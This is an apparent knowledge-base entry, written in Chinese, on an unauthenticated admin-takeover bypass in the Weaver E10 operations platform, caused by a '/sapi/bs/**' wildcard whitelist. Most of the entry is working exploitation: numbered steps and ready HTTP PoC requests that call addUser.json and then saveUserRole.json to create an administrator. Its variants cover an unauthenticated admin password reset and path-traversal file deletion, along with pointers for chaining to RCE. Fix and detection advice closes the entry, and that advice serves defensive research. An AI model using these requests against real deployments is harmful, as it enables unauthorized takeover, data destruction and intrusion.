---
id: web-java-framework-spring-weaver-e10-sapi-bs-wildcard-auth-bypass-admin
title: 泛微 E10 运维平台 /sapi/bs/** 通配白名单全局鉴权绕过：未授权 addUser + saveUserRole 添加管理员
type: scenario
domain: web
path: web/java/framework/spring
technique: weaver-e10-sapi-bs-wildcard-auth-bypass-admin
aliases:
- 泛微 E10 鉴权绕过
- 泛微 E10 未授权添加管理员
- sapi/bs 白名单绕过
- addUser saveUserRole
- e-monitor 运维平台
tags:
- java
- spring
- spring-security
- auth-bypass
- weaver
- ecology
- e10
- e-monitor
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:32+08:00'
  notes: 已对照原文 core-service.xml/WebSecurityConfig 截图及 addUser/userList/saveUserRole/setUserPassWord 请求响应核对；未授权 addUser+saveUserRole 提权成立；已修正“web.ignoring+MVC 排除列表”的表述为 permitAll 通配白名单。
---

## 一句话结论

泛微 E10（Ecology 10）运维管理平台把 `/sapi/bs/**` 以通配形式加入 Spring Security 的 permitAll 白名单，而 `UIController` 的 `/sapi/bs/{operation:.+}` 会把任意 operation 转发到 `uiRule.customPost` 对应的业务 `doPost`；攻击者无需登录即可调用 `/sapi/bs/addUser.json` 创建用户，再用 `/sapi/bs/saveUserRole.json` 赋予管理员角色，直接接管后台。

## 原理

- 请求入口：`UIController` 上有 `@RequestMapping("/sapi/bs/{operation:.+}")` 的 `sapiPost` 方法，`operation` 为路径最后一段；它把请求交给 `uiRule.customPost(operation, request, response, requestBody)`。
- `CustomUIRule.customPost` 按 operation 依次分发到 `BaseControl` 子类的 `doPost`（文章展示了 `UIController`、`AppControl`、`ServerControl`、`UpgradeController` 等大量实现），因此只要 operation 名匹配，就能触发对应业务逻辑。
- 鉴权配置有两层：
  - `core-service.xml` 的 `<mvc:interceptors>` 登录拦截器 `mapping="/**"`，排除列表逐个列出 `/sapi/bs/licenseCodeForSecurity.json` 等免登接口，并注释“免登接口必须写全 否则有安全问题”。
  - `WebSecurityConfig.configure(HttpSecurity)` 的 permitAll 白名单（文章截图）包含 `"/sapi/bs/**"`、`"/cu/uploadFile/**"`、`"/cu/uploadFiles/**"`、`"/cd/downloadFile/**"` 等通配项。
- 关键问题在于 `"/sapi/bs/**"` 是整段通配：它覆盖 `/sapi/bs/` 下所有 operation，而 `sapiPost` 又会把任意 operation 分发给业务 `doPost`；文章实测 `/sapi/bs/addUser.json`、`/sapi/bs/saveUserRole.json`、`/sapi/bs/setUserPassWord.json` 等均可在未登录状态调用。

## 触发条件

- 目标为泛微 E10 运维管理平台（e-monitor，默认 9081 端口；文章测试 Ecology10.0.2403.01）。
- `/sapi/bs/**` 未被网关/WAF 单独拦截，且 `sapiPost` 路由可达。
- 目标用户表允许通过 `addUser.json` 新增用户（默认业务逻辑即如此）。

## 利用步骤

1. 未登录直接 POST `/sapi/bs/addUser.json` 创建普通用户（密码明文提交）：
   `{"userName":"test","passWord":"A123456","nickName":"","status":"0","createTime":"","updateTime":""}`。
2. POST `/sapi/bs/userList.json`（空 JSON）列出用户，拿到新增用户的 `id`（文章示例为 8）。
3. POST `/sapi/bs/saveUserRole.json`，`{"roleId":3,"userId":8}`，把该用户绑定到管理员角色（roleId=3）。
4. 用 `test/A123456` 登录后台，即可看到运维管理平台完整菜单（用户权限管理、系统设置、主节点管理等）。

## PoC

```http
POST /sapi/bs/addUser.json HTTP/1.1
Host: target:9081
Content-Type: application/json;charset=UTF-8

{"userName":"test","passWord":"A123456","nickName":"","status":"0","createTime":"","updateTime":""}
```

```http
POST /sapi/bs/userList.json HTTP/1.1
Host: target:9081
Content-Type: application/json;charset=UTF-8

{}
```

```http
POST /sapi/bs/saveUserRole.json HTTP/1.1
Host: target:9081
Content-Type: application/json;charset=UTF-8

{"roleId":3,"userId":8}
```

## 变体与关联

- **直接改管理员密码**：`POST /sapi/bs/setUserPassWord.json`，body 中 `username`/`password` 为前端加密后的 Base64 密文；文章示例解密后为 `admin` / `Aa123456`，返回 `{"code":"0","success":true}`。
- **未授权文件删除**：`POST /sapi/bs/rc_deleteBatchServer.json`，body `{"fileName":"../../.../1.txt"}`，`ResourceCenterControl.deleteBatchServer` 用 `new File(packagePath, fileName).delete()`，返回“删除成功”。
- **未授权信息泄露**：`POST /sapi/bs/getAllRuleClusterInfo`（或 `/getAllRuleClusterInfo`）返回规则集群、集群 ID、版本等内部信息。
- **后续利用**：同一白名单还覆盖 `/cu/uploadFile/**`、`/cu/uploadFiles/**`、`/cd/downloadFile/**`、`/sapi/bs/addMysqlMonitor.json` 等，可衔接任意文件上传/移动 RCE、路径穿越文件读取、JDBC 任意文件读取等链。
- **关联**：[[web-java-framework-spring-cloudfoundry-actuator-ignoring-bypass]]（同为 `web.ignoring` 整段路径导致认证绕过）、[[code-analysis-source-audit-java-auth-config-unauth-endpoint-enumeration]]（从鉴权配置枚举未授权入口）。

## 检测与防御

- **修复**：移除 `/sapi/bs/**` 这类通配白名单，只逐个列出确需免登的接口（且只允许 GET/POST 必要方法）；在 `BaseControl.doPost` 或 `sapiPost` 入口强制校验会话/令牌与权限，不能依赖外层拦截器。
- **加固**：对 `/sapi/bs/*.json` 做操作白名单与角色校验；关闭或限制 `/h2-console/**`、`/imserver/**`、`/websocket/**` 等不必要暴露面；网关层对运维平台限制来源 IP。
- **检测**：监控未带有效会话的 `/sapi/bs/*.json` 请求，尤其是 `addUser.json`、`saveUserRole.json`、`setUserPassWord.json`、`rc_deleteBatchServer.json`；审计新增用户与角色变更。
